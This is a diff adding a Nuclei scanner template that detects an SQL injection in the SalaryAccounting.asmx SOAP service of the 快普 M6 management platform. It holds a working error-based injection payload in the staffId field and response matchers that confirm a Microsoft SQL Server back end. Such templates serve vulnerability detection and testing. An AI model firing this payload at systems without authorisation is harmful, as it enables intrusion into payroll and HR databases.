@@ -1,0 +1,44 @@
+id: philip-m6-salaryaccounting-sqli
+
+info:
+  name: 快普整合管理平台系统 SalaryAccounting.asmx SQL注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: http://tempuri.org/Calculate
+        Content-Type: text/xml;charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
+        
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:Header/>
+        <soapenv:Body>
+          <tem:Calculate>
+            <!--type: string-->
+            <tem:SalaryCategory></tem:SalaryCategory>
+            <!--type: string-->
+            <tem:StaffBirthDay></tem:StaffBirthDay>
+            <!--type: string-->
+            <tem:staffId>
+            1) and 1=@@version--+</tem:staffId>
+            <!--type: string-->
+            <tem:Department></tem:Department>
+            <!--type: string-->
+            <tem:SubOrg></tem:SubOrg>
+            <!--type: string-->
+            <tem:taxMonthly></tem:taxMonthly>
+          </tem:Calculate>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - status_code == 500
+          - contains_all(body,"转换成数据类型","Microsoft SQL Server")
